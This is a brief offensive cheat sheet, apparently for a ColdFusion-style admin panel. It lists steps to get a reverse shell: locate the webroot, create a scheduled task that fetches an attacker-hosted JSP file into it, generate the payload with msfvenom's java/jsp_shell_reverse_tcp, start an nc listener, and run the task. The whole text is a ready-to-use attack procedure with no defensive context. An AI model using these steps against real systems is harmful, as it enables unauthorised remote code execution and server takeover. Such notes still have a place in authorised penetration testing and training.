### get path to webroot
```
Server Settings > Mappings
```

### get reverse shell using scheduled task
```
Debugging & Logging > Scheduled Tasks > Schedule New Task
```

### insert parameters
```
Task Name: <name>
URL: http://<lhost>/<file>.jsp
Check: Save output to a file
File: <path>\<file>.jsp
Submit
```

### generate reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f raw > <file>.jsp
```

### start listener
```
nc -lnvp <lport>
```

### start task
```
Actions > Run Scheduled Task
```

